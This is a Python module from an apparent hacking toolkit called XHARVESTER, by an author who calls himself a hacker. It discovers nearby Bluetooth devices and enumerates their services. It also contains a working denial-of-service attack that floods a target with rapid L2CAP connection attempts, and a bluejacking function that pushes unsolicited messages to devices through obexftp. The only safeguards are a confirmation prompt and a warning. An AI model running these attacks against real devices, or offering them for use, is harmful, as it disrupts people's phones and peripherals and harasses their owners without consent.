#!/usr/bin/env python3
"""
Bluetooth Security Testing Module
Professional Bluetooth penetration testing and security assessment

Author: N3twork(GHANA) - Computer Programmer & Hacker
Version: 1.0
"""

import sys
import os
import time
import subprocess
import threading
import socket
import struct
from typing import List, Dict, Optional, Any
import json

# Try to import bluetooth library with fallback
try:
    import bluetooth
    BLUETOOTH_LIB_AVAILABLE = True
except ImportError:
    BLUETOOTH_LIB_AVAILABLE = False
    # Create mock bluetooth module
    class MockBluetooth:
        class BluetoothSocket:
            L2CAP = 1
            def __init__(self, proto):
                self.proto = proto
            def settimeout(self, timeout):
                pass
            def connect(self, addr):
                raise Exception("Bluetooth library not available")
            def close(self):
                pass
    bluetooth = MockBluetooth()

# Import application dependencies
sys.path.append(os.path.dirname(os.path.dirname(__file__)))
from config import Config, Colors
from utils import (
    SystemUtils, MenuRenderer, Logger, InputValidator, 
    Animation, error_handler
)

class BluetoothDevice:
    """Represents a discovered Bluetooth device"""
    
    def __init__(self, address: str, name: str = "Unknown", device_class: int = 0):
        self.address = address
        self.name = name
        self.device_class = device_class
        self.services = []
        self.vulnerabilities = []
        self.rssi = None
        
    def __str__(self):
        return f"{self.address} ({self.name})"

class BluetoothScanner:
    """Bluetooth device discovery and scanning"""
    
    def __init__(self):
        self.logger = Logger.get_logger("bluetooth_scanner")
        self.discovered_devices = {}
        
    def scan_devices(self, duration: int = 10, lookup_names: bool = True) -> List[BluetoothDevice]:
        """Scan for nearby Bluetooth devices"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] Bluetooth Device Discovery")
        print(f"{Colors.INFO}  Scanning for {duration} seconds...")
        
        devices = []
        
        try:
            # Use bluetoothctl for discovery
            print(f"{Colors.BLUE}  Starting Bluetooth discovery...")
            
            # Enable discovery
            subprocess.run(['bluetoothctl', 'scan', 'on'], 
                         capture_output=True, timeout=2)
            
            # Wait for scan duration
            time.sleep(duration)
            
            # Get discovered devices
            result = subprocess.run(['bluetoothctl', 'devices'], 
                                  capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if line.startswith('Device'):
                        parts = line.split(' ', 2)
                        if len(parts) >= 2:
                            address = parts[1]
                            name = parts[2] if len(parts) > 2 else "Unknown"
                            
                            device = BluetoothDevice(address, name)
                            devices.append(device)
                            self.discovered_devices[address] = device
                            
                            print(f"{Colors.GREEN}    • {address} - {name}")
            
            # Stop discovery
            subprocess.run(['bluetoothctl', 'scan', 'off'], 
                         capture_output=True, timeout=2)
            
        except Exception as e:
            self.logger.error(f"Bluetooth scan error: {e}")
            print(f"{Colors.ERROR}  Scan error: {e}")
        
        print(f"\n{Colors.SUCCESS}  Found {len(devices)} Bluetooth devices")
        return devices
    
    def get_device_info(self, address: str) -> Dict[str, Any]:
        """Get detailed information about a specific device"""
        info = {
            'address': address,
            'name': 'Unknown',
            'class': 0,
            'rssi': None,
            'services': [],
            'manufacturer': 'Unknown'
        }
        
        try:
            # Get device info using bluetoothctl
            result = subprocess.run(['bluetoothctl', 'info', address], 
                                  capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    line = line.strip()
                    if line.startswith('Name:'):
                        info['name'] = line.split(':', 1)[1].strip()
                    elif line.startswith('Class:'):
                        info['class'] = line.split(':', 1)[1].strip()
                    elif line.startswith('RSSI:'):
                        try:
                            info['rssi'] = int(line.split(':', 1)[1].strip())
                        except:
                            pass
                    elif line.startswith('UUID:'):
                        service = line.split(':', 1)[1].strip()
                        info['services'].append(service)
            
        except Exception as e:
            self.logger.error(f"Error getting device info for {address}: {e}")
        
        return info

class BluetoothAttacker:
    """Bluetooth attack and exploitation tools"""
    
    def __init__(self):
        self.logger = Logger.get_logger("bluetooth_attacker")
        
    def l2ping_scan(self, target: str, count: int = 5) -> Dict[str, Any]:
        """Perform L2CAP ping scan"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] L2CAP Ping Scan: {target}")
        
        results = {
            'target': target,
            'responses': 0,
            'avg_time': 0,
            'status': 'unreachable'
        }
        
        try:
            cmd = ['l2ping', '-c', str(count), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                # Parse l2ping output
                lines = result.stdout.split('\n')
                responses = 0
                total_time = 0
                
                for line in lines:
                    if 'bytes from' in line and 'time=' in line:
                        responses += 1
                        # Extract time
                        try:
                            time_part = line.split('time=')[1].split('ms')[0]
                            total_time += float(time_part)
                        except:
                            pass
                
                results['responses'] = responses
                results['avg_time'] = total_time / responses if responses > 0 else 0
                results['status'] = 'reachable' if responses > 0 else 'unreachable'
                
                print(f"{Colors.SUCCESS}    Responses: {responses}/{count}")
                print(f"{Colors.INFO}    Average time: {results['avg_time']:.2f}ms")
            else:
                print(f"{Colors.WARNING}    Target unreachable")
                
        except Exception as e:
            self.logger.error(f"L2ping error: {e}")
            print(f"{Colors.ERROR}    L2ping failed: {e}")
        
        return results
    
    def service_discovery(self, target: str) -> List[Dict[str, Any]]:
        """Discover services on target device"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] Service Discovery: {target}")
        
        services = []
        
        try:
            # Use sdptool for service discovery
            cmd = ['sdptool', 'browse', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                # Parse sdptool output
                lines = result.stdout.split('\n')
                current_service = None
                
                for line in lines:
                    line = line.strip()
                    if line.startswith('Service Name:'):
                        if current_service:
                            services.append(current_service)
                        current_service = {
                            'name': line.split(':', 1)[1].strip(),
                            'description': '',
                            'channel': None,
                            'uuid': None
                        }
                    elif line.startswith('Service Description:') and current_service:
                        current_service['description'] = line.split(':', 1)[1].strip()
                    elif line.startswith('Channel:') and current_service:
                        try:
                            current_service['channel'] = int(line.split(':', 1)[1].strip())
                        except:
                            pass
                
                if current_service:
                    services.append(current_service)
                
                print(f"{Colors.SUCCESS}    Found {len(services)} services:")
                for service in services:
                    print(f"{Colors.GREEN}      • {service['name']}")
                    if service['channel']:
                        print(f"{Colors.INFO}        Channel: {service['channel']}")
            else:
                print(f"{Colors.WARNING}    Service discovery failed")
                
        except Exception as e:
            self.logger.error(f"Service discovery error: {e}")
            print(f"{Colors.ERROR}    Discovery failed: {e}")
        
        return services
    
    def bluetooth_dos_attack(self, target: str, duration: int = 10) -> bool:
        """Perform Bluetooth DoS attack"""
        print(f"\n{Colors.CYAN}  [{Colors.RED}⚠{Colors.CYAN}] Bluetooth DoS Attack")
        print(f"{Colors.WARNING}  Target: {target}")
        print(f"{Colors.WARNING}  Duration: {duration} seconds")
        print(f"{Colors.ERROR}  ⚠️  This attack may disrupt the target device!")
        
        confirm = input(f"\n{Colors.GREEN}  Continue with DoS attack? ({Colors.CYAN}y{Colors.GREEN}/{Colors.RED}N{Colors.GREEN}): {Colors.YELLOW}").strip().lower()
        if confirm not in ['y', 'yes']:
            print(f"{Colors.INFO}  Attack cancelled")
            return False
        
        try:
            print(f"\n{Colors.BLUE}  Launching DoS attack...")
            
            # L2CAP flood attack
            start_time = time.time()
            attacks_sent = 0
            
            while (time.time() - start_time) < duration:
                try:
                    # Rapid L2CAP connection attempts
                    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
                    sock.settimeout(0.1)
                    sock.connect((target, 1))
                    sock.close()
                    attacks_sent += 1
                except:
                    attacks_sent += 1
                
                if attacks_sent % 100 == 0:
                    elapsed = time.time() - start_time
                    print(f"{Colors.YELLOW}    Attack progress... {elapsed:.0f}s, {attacks_sent} packets sent")
            
            print(f"{Colors.SUCCESS}  DoS attack completed: {attacks_sent} packets sent")
            return True
            
        except Exception as e:
            self.logger.error(f"DoS attack error: {e}")
            print(f"{Colors.ERROR}  Attack failed: {e}")
            return False
    
    def bluejack_attack(self, target: str, message: str = "You've been BluejackeD!") -> bool:
        """Perform Bluejacking attack"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] Bluejacking Attack")
        print(f"{Colors.INFO}  Target: {target}")
        print(f"{Colors.INFO}  Message: {message}")
        
        try:
            # Send OBEX message
            print(f"{Colors.BLUE}  Sending bluejack message...")
            
            # Use obexftp for message sending
            temp_file = "/tmp/bluejack_message.txt"
            with open(temp_file, 'w') as f:
                f.write(message)
            
            cmd = ['obexftp', '-b', target, '-p', temp_file]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            os.remove(temp_file)
            
            if result.returncode == 0:
                print(f"{Colors.SUCCESS}  Bluejack message sent successfully!")
                return True
            else:
                print(f"{Colors.WARNING}  Bluejack failed - target may not accept files")
                return False
                
        except Exception as e:
            self.logger.error(f"Bluejack error: {e}")
            print(f"{Colors.ERROR}  Bluejack failed: {e}")
            return False

class BluetoothModule:
    """Main Bluetooth security testing module"""
    
    def __init__(self):
        self.logger = Logger.get_logger("bluetooth_module")
        self.hostname = SystemUtils.get_hostname()
        self.scanner = BluetoothScanner()
        self.attacker = BluetoothAttacker()
        self.discovered_devices = []
        
        # Check if Bluetooth is available
        self.bluetooth_available = self._check_bluetooth_availability()
    
    def _check_bluetooth_availability(self) -> bool:
        """Check if Bluetooth hardware and tools are available"""
        try:
            # Check if bluetoothctl is available
            result = subprocess.run(['which', 'bluetoothctl'], 
                                  capture_output=True, timeout=5)
            if result.returncode != 0:
                return False
            
            # Check if Bluetooth service is running
            try:
                result = subprocess.run(['systemctl', 'is-active', 'bluetooth'], 
                                      capture_output=True, timeout=5)
                service_running = result.returncode == 0
            except:
                service_running = True  # Assume running if can't check
            
            return service_running and BLUETOOTH_LIB_AVAILABLE
            
        except Exception as e:
            self.logger.error(f"Bluetooth availability check failed: {e}")
            return False
    
    def show_menu(self):
        """Display the Bluetooth module menu"""
        Animation.display_banner()
        MenuRenderer.render_menu_header(f"XHARVESTER {Colors.YELLOW}-{Colors.CYAN} BlueTooth MODULE")
        
        icons = {
            "1": "🔍",
            "2": "📡",
            "3": "🎯",
            "4": "💥",
            "5": "📱",
            "6": "🔧",
            "7": "📊",
            "8": "ℹ️",
            "0": "🚚"
        }
        
        menu_options = {
            "1": "Device Discovery & Scanning",
            "2": "Service Enumeration",
            "3": "L2CAP Ping Scan",
            "4": "Bluetooth DoS Attack",
            "5": "Bluejacking Attack",
            "6": "Bluetooth Tools & Utilities",
            "7": "Generate Security Report",
            "8": " Module Information",
            "0": "Return to Main Menu"
        }
        
        MenuRenderer.render_menu_options(menu_options, icons)
        MenuRenderer.render_menu_footer()
    
    def device_discovery(self):
        """Bluetooth device discovery interface"""
        if not self.bluetooth_available:
            print(f"{Colors.ERROR}  Bluetooth not available! Please check hardware and services.")
            return
        
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] Bluetooth Device Discovery")
        
        try:
            duration_input = input(f"{Colors.GREEN}  Scan duration (seconds) [10]: {Colors.YELLOW}") or "10"
            duration = InputValidator.validate_integer(duration_input, 1, 300)
            
            # Perform device scan
            devices = self.scanner.scan_devices(duration)
            self.discovered_devices = devices
            
            if devices:
                print(f"\n{Colors.MAGENTA}  Discovered Devices:")
                for i, device in enumerate(devices, 1):
                    print(f"{Colors.GREEN}    [{i}] {device.address} - {device.name}")
                
                # Get detailed info for first few devices
                print(f"\n{Colors.INFO}  Getting detailed information...")
                for device in devices[:3]:  # Limit to first 3 devices
                    info = self.scanner.get_device_info(device.address)
                    device.name = info.get('name', device.name)
                    device.services = info.get('services', [])
                    device.rssi = info.get('rssi')
                    
                    print(f"\n{Colors.BLUE}  Device: {device.address}")
                    print(f"{Colors.INFO}    Name: {device.name}")
                    if device.rssi:
                        print(f"{Colors.INFO}    RSSI: {device.rssi} dBm")
                    if device.services:
                        print(f"{Colors.INFO}    Services: {len(device.services)}")
            else:
                print(f"{Colors.WARNING}  No devices found in range")
                
        except ValueError as e:
            print(f"{Colors.ERROR}  Invalid input: {e}")
    
    def service_enumeration(self):
        """Service enumeration interface"""
        if not self.discovered_devices:
            print(f"{Colors.WARNING}  No devices discovered. Run device discovery first.")
            return
        
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] Bluetooth Service Enumeration")
        print(f"\n{Colors.INFO}  Available targets:")
        
        for i, device in enumerate(self.discovered_devices, 1):
            print(f"{Colors.GREEN}    [{i}] {device.address} - {device.name}")
        
        try:
            choice_input = input(f"\n{Colors.GREEN}  Select target [1]: {Colors.YELLOW}") or "1"
            choice = InputValidator.validate_integer(choice_input, 1, len(self.discovered_devices))
            
            target_device = self.discovered_devices[choice - 1]
            services = self.attacker.service_discovery(target_device.address)
            target_device.services = services
            
        except ValueError as e:
            print(f"{Colors.ERROR}  Invalid selection: {e}")
    
    def l2cap_ping_scan(self):
        """L2CAP ping scan interface"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] L2CAP Ping Scan")
        
        try:
            if self.discovered_devices:
                print(f"\n{Colors.INFO}  Available targets:")
                for i, device in enumerate(self.discovered_devices, 1):
                    print(f"{Colors.GREEN}    [{i}] {device.address} - {device.name}")
                
                use_discovered = input(f"\n{Colors.GREEN}  Use discovered device? ({Colors.CYAN}y{Colors.GREEN}/{Colors.RED}N{Colors.GREEN}): {Colors.YELLOW}").strip().lower()
                
                if use_discovered in ['y', 'yes']:
                    choice_input = input(f"{Colors.GREEN}  Select target [1]: {Colors.YELLOW}") or "1"
                    choice = InputValidator.validate_integer(choice_input, 1, len(self.discovered_devices))
                    target = self.discovered_devices[choice - 1].address
                else:
                    target = input(f"{Colors.GREEN}  Target MAC address: {Colors.YELLOW}").strip()
            else:
                target = input(f"{Colors.GREEN}  Target MAC address: {Colors.YELLOW}").strip()
            
            count_input = input(f"{Colors.GREEN}  Ping count [5]: {Colors.YELLOW}") or "5"
            count = InputValidator.validate_integer(count_input, 1, 100)
            
            # Validate MAC address format
            if not InputValidator.validate_mac_address(target):
                raise ValueError("Invalid MAC address format")
            
            # Perform L2CAP ping
            results = self.attacker.l2ping_scan(target, count)
            
        except ValueError as e:
            print(f"{Colors.ERROR}  Invalid input: {e}")
    
    def bluetooth_dos_attack(self):
        """Bluetooth DoS attack interface"""
        print(f"\n{Colors.CYAN}  [{Colors.RED}⚠{Colors.CYAN}] Bluetooth DoS Attack")
        print(f"{Colors.ERROR}  ⚠️  WARNING: This attack can disrupt Bluetooth devices!")
        print(f"{Colors.WARNING}  Use only on authorized targets for testing purposes!")
        
        try:
            if self.discovered_devices:
                print(f"\n{Colors.INFO}  Available targets:")
                for i, device in enumerate(self.discovered_devices, 1):
                    print(f"{Colors.GREEN}    [{i}] {device.address} - {device.name}")
                
                use_discovered = input(f"\n{Colors.GREEN}  Use discovered device? ({Colors.CYAN}y{Colors.GREEN}/{Colors.RED}N{Colors.GREEN}): {Colors.YELLOW}").strip().lower()
                
                if use_discovered in ['y', 'yes']:
                    choice_input = input(f"{Colors.GREEN}  Select target [1]: {Colors.YELLOW}") or "1"
                    choice = InputValidator.validate_integer(choice_input, 1, len(self.discovered_devices))
                    target = self.discovered_devices[choice - 1].address
                else:
                    target = input(f"{Colors.GREEN}  Target MAC address: {Colors.YELLOW}").strip()
            else:
                target = input(f"{Colors.GREEN}  Target MAC address: {Colors.YELLOW}").strip()
            
            duration_input = input(f"{Colors.GREEN}  Attack duration (seconds) [10]: {Colors.YELLOW}") or "10"
            duration = InputValidator.validate_integer(duration_input, 1, 60)
            
            # Validate MAC address
            if not InputValidator.validate_mac_address(target):
                raise ValueError("Invalid MAC address format")
            
            # Perform DoS attack
            self.attacker.bluetooth_dos_attack(target, duration)
            
        except ValueError as e:
            print(f"{Colors.ERROR}  Invalid input: {e}")
    
    def bluejacking_attack(self):
        """Bluejacking attack interface"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] Bluejacking Attack")
        print(f"{Colors.INFO}  Send unsolicited messages to Bluetooth devices")
        
        try:
            if self.discovered_devices:
                print(f"\n{Colors.INFO}  Available targets:")
                for i, device in enumerate(self.discovered_devices, 1):
                    print(f"{Colors.GREEN}    [{i}] {device.address} - {device.name}")
                
                use_discovered = input(f"\n{Colors.GREEN}  Use discovered device? ({Colors.CYAN}y{Colors.GREEN}/{Colors.RED}N{Colors.GREEN}): {Colors.YELLOW}").strip().lower()
                
                if use_discovered in ['y', 'yes']:
                    choice_input = input(f"{Colors.GREEN}  Select target [1]: {Colors.YELLOW}") or "1"
                    choice = InputValidator.validate_integer(choice_input, 1, len(self.discovered_devices))
                    target = self.discovered_devices[choice - 1].address
                else:
                    target = input(f"{Colors.GREEN}  Target MAC address: {Colors.YELLOW}").strip()
            else:
                target = input(f"{Colors.GREEN}  Target MAC address: {Colors.YELLOW}").strip()
            
            message = input(f"{Colors.GREEN}  Message [You've been BluejackeD!]: {Colors.YELLOW}") or "You've been BluejackeD!"
            
            # Validate MAC address
            if not InputValidator.validate_mac_address(target):
                raise ValueError("Invalid MAC address format")
            
            # Perform bluejacking
            self.attacker.bluejack_attack(target, message)
            
        except ValueError as e:
            print(f"{Colors.ERROR}  Invalid input: {e}")
    
    def bluetooth_tools(self):
        """Bluetooth tools and utilities"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] Bluetooth Tools & Utilities")
        
        print(f"\n{Colors.MAGENTA}  System Information:")
        
        # Check Bluetooth adapter
        try:
            result = subprocess.run(['hciconfig'], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(f"{Colors.SUCCESS}  ✅ Bluetooth adapter detected")
                print(f"{Colors.INFO}  Adapter details:")
                for line in result.stdout.split('\n')[:5]:  # First few lines
                    if line.strip():
                        print(f"{Colors.CYAN}    {line.strip()}")
            else:
                print(f"{Colors.WARNING}  ⚠️  No Bluetooth adapter found")
        except:
            print(f"{Colors.ERROR}  ❌ Failed to check Bluetooth adapter")
        
        # Check required tools
        tools = [
            ('bluetoothctl', 'Bluetooth control utility'),
            ('hcitool', 'HCI configuration tool'),
            ('sdptool', 'Service Discovery Protocol tool'),
            ('l2ping', 'L2CAP ping utility'),
            ('obexftp', 'OBEX file transfer'),
            ('rfcomm', 'RFCOMM configuration')
        ]
        
        print(f"\n{Colors.MAGENTA}  Available Tools:")
        for tool, description in tools:
            try:
                result = subprocess.run(['which', tool], capture_output=True, timeout=5)
                status = "✅" if result.returncode == 0 else "❌"
                print(f"{Colors.INFO}    {status} {tool}: {description}")
            except:
                print(f"{Colors.ERROR}    ❌ {tool}: {description}")
        
        # Quick system commands
        print(f"\n{Colors.MAGENTA}  Quick Commands:")
        print(f"{Colors.YELLOW}    • Enable adapter: sudo hciconfig hci0 up")
        print(f"{Colors.YELLOW}    • Scan devices: hcitool scan")
        print(f"{Colors.YELLOW}    • Monitor: sudo hcidump")
        print(f"{Colors.YELLOW}    • Check services: sudo systemctl status bluetooth")
    
    def generate_report(self):
        """Generate Bluetooth security assessment report"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}+{Colors.CYAN}] Bluetooth Security Report Generation")
        
        if not self.discovered_devices:
            print(f"{Colors.WARNING}  No assessment data available. Perform scans first.")
            return
        
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        report_file = os.path.join("reports", f"bluetooth_security_report_{timestamp}.txt")
        
        try:
            os.makedirs("reports", exist_ok=True)
            
            with open(report_file, 'w') as f:
                f.write("===============================================\n")
                f.write("  BLUETOOTH SECURITY ASSESSMENT REPORT\n")
                f.write("===============================================\n\n")
                f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Assessor: {Config.APP_NAME} v{Config.VERSION}\n")
                f.write(f"Environment: {Config.CURRENT_PLATFORM}\n\n")
                
                f.write("DISCOVERED DEVICES\n")
                f.write("==================\n\n")
                
                for i, device in enumerate(self.discovered_devices, 1):
                    f.write(f"[{i}] Device: {device.address}\n")
                    f.write(f"    Name: {device.name}\n")
                    if device.rssi:
                        f.write(f"    RSSI: {device.rssi} dBm\n")
                    if device.services:
                        f.write(f"    Services: {len(device.services)}\n")
                        for service in device.services:
                            f.write(f"      • {service.get('name', 'Unknown')}\n")
                    f.write("\n")
                
                f.write("SECURITY RECOMMENDATIONS\n")
                f.write("========================\n\n")
                f.write("1. Disable Bluetooth when not in use\n")
                f.write("2. Use non-discoverable mode\n")
                f.write("3. Implement strong authentication\n")
                f.write("4. Keep Bluetooth firmware updated\n")
                f.write("5. Monitor for unauthorized connections\n")
                f.write("6. Use encryption for sensitive data\n")
            
            print(f"{Colors.SUCCESS}  Report generated: {report_file}")
            
        except Exception as e:
            self.logger.error(f"Report generation error: {e}")
            print(f"{Colors.ERROR}  Report generation failed: {e}")
    
    def module_information(self):
        """Display module information"""
        print(f"\n{Colors.CYAN}  [{Colors.GREEN}ℹ{Colors.CYAN}] Bluetooth Module Information")
        
        print(f"\n{Colors.MAGENTA}  Module Details:")
        print(f"{Colors.GREEN}    • Name: Bluetooth Security Testing Module")
        print(f"{Colors.GREEN}    • Version: 1.0")
        print(f"{Colors.GREEN}    • Author: N3twork(GHANA) - Computer Programmer & Hacker")
        print(f"{Colors.GREEN}    • Purpose: Bluetooth penetration testing")
        
        print(f"\n{Colors.MAGENTA}  Capabilities:")
        print(f"{Colors.CYAN}    • Device discovery and enumeration")
        print(f"{Colors.CYAN}    • Service identification")
        print(f"{Colors.CYAN}    • L2CAP ping scanning")
        print(f"{Colors.CYAN}    • Bluetooth DoS attacks")
        print(f"{Colors.CYAN}    • Bluejacking attacks")
        print(f"{Colors.CYAN}    • Security assessment reporting")
        
        print(f"\n{Colors.MAGENTA}  Requirements:")
        print(f"{Colors.YELLOW}    • Bluetooth adapter (CSR recommended)")
        print(f"{Colors.YELLOW}    • BlueZ Bluetooth stack")
        print(f"{Colors.YELLOW}    • Root privileges for some operations")
        
        print(f"\n{Colors.MAGENTA}  Status:")
        print(f"{Colors.SUCCESS if self.bluetooth_available else Colors.ERROR}    • Bluetooth: {'Available' if self.bluetooth_available else 'Not Available'}")
        print(f"{Colors.INFO}    • Discovered devices: {len(self.discovered_devices)}")
    
    def main(self):
        """Main Bluetooth module loop"""
        if not self.bluetooth_available:
            print(f"\n{Colors.ERROR}  Bluetooth hardware or services not available!")
            print(f"{Colors.INFO}  Please check:")
            print(f"{Colors.YELLOW}    • Bluetooth adapter is connected")
            print(f"{Colors.YELLOW}    • Bluetooth service is running: sudo systemctl start bluetooth")
            print(f"{Colors.YELLOW}    • Required tools are installed: sudo apt install bluetooth bluez-utils")
            if not BLUETOOTH_LIB_AVAILABLE:
                print(f"{Colors.YELLOW}    • Python Bluetooth library: sudo apt install python3-bluetooth")
            input(f"\n{Colors.GREEN}  Press Enter to continue anyway...")
        
        try:
            while True:
                try:
                    SystemUtils.clear_screen()
                    self.show_menu()
                    choice = MenuRenderer.get_user_input(self.hostname)
                    
                    if choice == "0":
                        print(f"\n{Colors.MAGENTA} 🚪{Colors.YELLOW}Returning to main menu...")
                        break
                    elif choice == "1":
                        self.device_discovery()
                    elif choice == "2":
                        self.service_enumeration()
                    elif choice == "3":
                        self.l2cap_ping_scan()
                    elif choice == "4":
                        self.bluetooth_dos_attack()
                    elif choice == "5":
                        self.bluejacking_attack()
                    elif choice == "6":
                        self.bluetooth_tools()
                    elif choice == "7":
                        self.generate_report()
                    elif choice == "8":
                        self.module_information()
                    else:
                        print(f"\n{Colors.WARNING}'{choice}' is not a valid option!")
                    
                    if choice != "0":
                        input(f"\n  {Colors.GREEN}Press Enter to continue...")
                        
                except (KeyboardInterrupt, EOFError):
                    print(f"\n{Colors.MAGENTA} 🚪{Colors.YELLOW}Returning to main menu...")
                    break
                    
        except Exception as e:
            self.logger.error(f"Bluetooth module error: {e}", exc_info=True)
            print(f"{Colors.ERROR}Module error: {e}")

if __name__ == "__main__":
    try:
        bt_module = BluetoothModule()
        bt_module.main()
    except Exception as e:
        print(f"{Colors.ERROR}Critical error: {e}")